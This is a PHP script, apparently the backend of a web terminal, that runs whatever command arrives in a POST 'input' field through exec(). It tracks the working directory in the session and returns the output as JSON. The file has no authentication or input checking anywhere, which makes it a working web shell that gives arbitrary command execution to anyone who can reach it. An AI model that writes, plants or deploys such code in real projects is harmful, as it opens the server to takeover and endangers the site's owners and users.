<?php

session_start();
if (!isset($_SESSION['pwd'])) {
	$_SESSION['pwd'] = getcwd();
}
chdir($_SESSION['pwd']);

$inputs = isset($_POST['input']) ? array($_POST['input']) : null;

$outputs = array();

switch (true) {
	case !$inputs[0]: //return empty json object on no input.
		echo "[]";
		break;
	/** @noinspection PhpMissingBreakStatementInspection */
	case preg_match("/^cd\\s+(.*)$/", $inputs[0], $matches):  //TODO: because each time PHP fires up it starts from the same initial directory, chaining cd commands won't work.  To make it work, I'll need to add pwd state into this that it can always chdir to first at the start of a call
		array_pop($inputs); //remove the cd from the inputs, since we can't actually run it directly through the shell.
		$chdirSuccess = chdir($matches[1]); //actually change the directory.
		$cwd = getcwd();
		if ($chdirSuccess) {
			$outputs[] = array("Changed path to $cwd");
			$_SESSION['pwd'] = $cwd;
		} else {
			$outputs[] = array("Unable to change path to $cwd");
		}
		//add a dir/ls command after the change so we can see the files around us.
		if (DIRECTORY_SEPARATOR === "/") { //linux
			$inputs[] = "ls";
		} else { //windows
			$inputs[] = "dir";
		}
	default:
		$outputs = array_merge($outputs, runExec($inputs));
}

echo json_encode(array(
	"pwd"     => $_SESSION['pwd'],
	"outputs" => $outputs
	));

function runExec($inputs) {
	$outputs = array();
	foreach ($inputs as $input) {
		exec($input, $output);
		$outputs[] = array_map(function($line) {
			return htmlspecialchars($line);
		}, $output);
	}
	return $outputs;
}

